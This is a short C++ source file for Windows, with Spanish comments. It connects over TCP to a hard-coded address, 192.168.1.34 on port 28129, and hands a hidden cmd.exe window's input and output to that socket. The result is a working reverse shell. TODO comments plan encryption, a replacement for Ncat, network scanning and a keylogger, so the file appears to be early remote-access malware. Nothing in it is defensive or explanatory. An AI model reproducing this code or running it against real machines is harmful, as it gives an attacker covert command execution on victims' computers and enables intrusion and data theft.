#include <iostream>
#include <WinSock2.h>
#include <cstring>
#pragma comment(lib, "Ws2_32.lib")

WSADATA wsadta;
SOCKET Wsocket;
struct sockaddr_in hx;
STARTUPINFO si;
PROCESS_INFORMATION pi;

short Puerto = 28129;

int main()
{

    // Inicia el dll de winsock
    WSAStartup(MAKEWORD(2, 2), &wsadta);
    char ac[80];
    Wsocket = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    hx.sin_family = AF_INET;
    hx.sin_port = htons(Puerto);
    hx.sin_addr.s_addr = inet_addr("192.168.1.34");
    std::cout << "tring to connect "<< "192.168.1.34" << std::endl;
    int r = WSAConnect(Wsocket, (SOCKADDR *)&hx, sizeof(hx), NULL, NULL, NULL, NULL);
        if (r == 0)
        {
            std::cout << "god" << std::endl;
        }
        else{
            std::cout << "cant " << WSAGetLastError() << std::endl;
        }
    std::memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)Wsocket;
    if (!CreateProcess(NULL, (LPSTR) "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        std::cout << "Errorsito" << std::endl;
    }
    //TODO: Archivos
    //TODO: Prioridad
    //TODO: Encriptacion
    //TODO: Backend (Remplazar Ncat)
    //TODO: Protocolo (GET tcp TODOS, Si hay respuesta, conectarse a esa IP)
    //TODO: Keylogger
}